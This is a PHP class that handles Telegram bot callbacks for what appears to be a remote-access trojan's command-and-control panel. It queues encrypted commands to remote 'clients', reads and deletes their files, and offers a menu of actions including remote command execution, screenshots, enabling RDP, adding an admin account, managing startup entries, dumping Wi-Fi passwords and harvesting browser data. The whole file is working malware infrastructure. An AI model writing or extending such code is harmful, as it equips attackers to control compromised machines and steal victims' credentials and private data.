<?php
namespace Handlers;

use Services\LoggerService;
use Services\TelegramService;
use Services\ClientService;
use Services\EncryptionService;
use PDO;

require_once __DIR__ . '/../../config.php';

class CallbackQueryHandler
{
    private $pdo;
    private $logger;
    private $telegram;
    private $clientService;
    private $encryption;

    public function __construct(PDO $pdo, LoggerService $logger, TelegramService $telegram, ClientService $clientService)
    {
        $this->pdo = $pdo;
        $this->logger = $logger;
        $this->telegram = $telegram;
        $this->clientService = $clientService;
        $this->encryption = new EncryptionService($logger);
    }

    public function handle(array $callbackQuery)
    {
        $chatId = $callbackQuery['message']['chat']['id'] ?? null;
        $userId = $callbackQuery['from']['id'] ?? null;
        $data = $callbackQuery['data'] ?? null;
        $callbackQueryId = $callbackQuery['id'] ?? null;

        $this->logger->logWebhook("Processing callback_query: id=$callbackQueryId, user_id=$userId, chat_id=$chatId, data=$data");

        if (!$chatId || !$userId || !$data || !$callbackQueryId) {
            $this->handleInvalidQuery($callbackQueryId, $chatId, json_encode($callbackQuery));
            return;
        }

        if (!$this->clientService->isUserAuthorized($userId)) {
            $this->handleUnauthorized($callbackQueryId, $chatId);
            return;
        }

        if (!str_contains($data, ':')) {
            $this->handleInvalidData($callbackQueryId, $chatId, $data);
            return;
        }

        list($action, $value) = explode(':', $data, 2);
        $this->logger->logWebhook("Callback action: $action, value: $value");

        if ($action === 'select_client') {
            $this->handleSelectClient($callbackQueryId, $chatId, $userId, $value);
        } elseif ($action === 'command') {
            $this->handleCommand($callbackQueryId, $chatId, $userId, $value);
        } elseif ($action === 'file_action') {
            $this->handleFileAction($callbackQueryId, $chatId, $userId, $value);
        } else {
            $this->telegram->sendMessage($chatId, "Error: Unknown action.");
            $this->logger->logError("Unknown callback action: $action, data: $data");
        }

        $this->telegram->answerCallbackQuery($callbackQueryId);
    }

    private function handleInvalidQuery(string $callbackQueryId, ?string $chatId, string $data)
    {
        $this->logger->logError("Invalid callback_query: missing required fields, data=$data");
        $this->telegram->answerCallbackQuery($callbackQueryId, 'Error: Invalid request', true);
        if ($chatId) {
            $this->telegram->sendMessage($chatId, "Error: Invalid callback request.");
        }
    }

    private function handleUnauthorized(string $callbackQueryId, string $chatId)
    {
        $this->telegram->sendMessage($chatId, "Unauthorized access. Only the admin can issue commands.");
        $this->telegram->answerCallbackQuery($callbackQueryId, 'Unauthorized', true);
    }

    private function handleInvalidData(string $callbackQueryId, string $chatId, string $data)
    {
        $this->logger->logError("Invalid callback_data format: $data");
        $this->telegram->sendMessage($chatId, "Error: Invalid callback data.");
        $this->telegram->answerCallbackQuery($callbackQueryId, 'Invalid callback data', true);
    }

    private function handleSelectClient(string $callbackQueryId, string $chatId, string $userId, string $clientId)
    {
        if ($this->clientService->clientExists($clientId)) {
            $this->clientService->setSelectedClient($userId, $clientId);
            $this->telegram->sendMessage($chatId, "Selected client: $clientId. Choose a command:", [
                'reply_markup' => $this->getCommandKeyboard()
            ]);
            $this->logger->logWebhook("Client selected via callback: $clientId, user_id: $userId, chat_id: $chatId");
        } else {
            $this->telegram->sendMessage($chatId, "Client ID '$clientId' not found. Use /start to see available clients.");
            $this->logger->logError("Invalid client_id in callback: $clientId, user_id: $userId, chat_id: $chatId");
            $this->telegram->answerCallbackQuery($callbackQueryId, 'Client not found', true);
        }
    }

    private function handleCommand(string $callbackQueryId, string $chatId, string $userId, string $command)
    {
        $selectedClient = $this->clientService->getSelectedClient($userId);
        if ($selectedClient) {
            $response = $this->queueCommand($selectedClient, $command);
            $this->telegram->sendMessage($chatId, "Command '$command' queued for client $selectedClient.");
            $this->logger->logWebhook("Command queued: $command for client: $selectedClient, response: " . json_encode($response));
        } else {
            $this->telegram->sendMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            $this->logger->logError("Command attempted without selected client, command: $command, user_id: $userId, chat_id: $chatId");
            $this->telegram->answerCallbackQuery($callbackQueryId, 'No client selected', true);
        }
    }

    private function handleFileAction(string $callbackQueryId, string $chatId, string $userId, string $value)
    {
        list($subAction, $path) = explode('|', $value, 2);
        $selectedClient = $this->clientService->getSelectedClient($userId);
        if ($selectedClient) {
            if ($subAction === 'read') {
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'read', 'path' => $path]];
                $this->queueCommand($selectedClient, $commandData);
                $this->telegram->sendMessage($chatId, "Reading file: $path");
            } elseif ($subAction === 'delete') {
                $commandData = ['type' => 'file_operation', 'params' => ['action' => 'delete', 'path' => $path]];
                $this->queueCommand($selectedClient, $commandData);
                $this->telegram->sendMessage($chatId, "Deleting file/folder: $path");
            }
            $this->logger->logWebhook("File action queued: $subAction for path: $path, client: $selectedClient");
        } else {
            $this->telegram->sendMessage($chatId, "No client selected. Use /start or /select <client_id>.");
            $this->telegram->answerCallbackQuery($callbackQueryId, 'No client selected', true);
        }
    }

    private function queueCommand(string $clientId, $command): array
    {
        try {
            $encryptedCommand = $this->encryption->encrypt(is_array($command) ? json_encode($command) : $command);
            $stmt = $this->pdo->prepare(
                "INSERT INTO client_commands (client_id, command, status, created_at) 
                VALUES (?, ?, 'pending', NOW())"
            );
            $stmt->execute([$clientId, $encryptedCommand]);
            return ['status' => 'success'];
        } catch (\PDOException $e) {
            $this->logger->logError("Failed to queue command for client_id: $clientId, error: " . $e->getMessage());
            return ['error' => 'Failed to queue command'];
        }
    }

    private function getCommandKeyboard(): array
    {
        $commands = [
            '/status' => 'System Status',
            '/screenshot' => 'Take Screenshot',
            '/upload' => 'Upload File',
            '/exec' => 'Execute Command',
            '/logs' => 'View Logs',
            '/hosts' => 'View Hosts',
            '/screens' => 'List Screenshots',
            '/browse' => 'Browse Directory',
            '/get-info' => 'System Info',
            '/go' => 'Open URL',
            '/shutdown' => 'Shutdown',
            '/test_telegram' => 'Test Telegram',
            '/upload_file' => 'Upload File',
            '/upload_url' => 'Upload from URL',
            '/tasks' => 'List Tasks',
            '/startup' => 'Manage Startup',
            '/signout' => 'Sign Out',
            '/sleep' => 'Sleep',
            '/restart' => 'Restart',
            '/listusers' => 'List Users',
            '/addadmin' => 'Add Admin',
            '/end_task' => 'End Task',
            '/enable_rdp' => 'Enable RDP',
            '/disable_rdp' => 'Disable RDP',
            '/getwifipasswords' => 'Get Wi-Fi Passwords',
            '/get_browser_data' => 'Get Browser Data',
            '/select' => 'Select Client'
        ];

        $keyboard = ['inline_keyboard' => []];
        $row = [];
        foreach ($commands as $cmd => $label) {
            $row[] = ['text' => $label, 'callback_data' => "command:$cmd"];
            if (count($row) == 2) {
                $keyboard['inline_keyboard'][] = $row;
                $row = [];
            }
        }
        if ($row) {
            $keyboard['inline_keyboard'][] = $row;
        }

        return $keyboard;
    }
}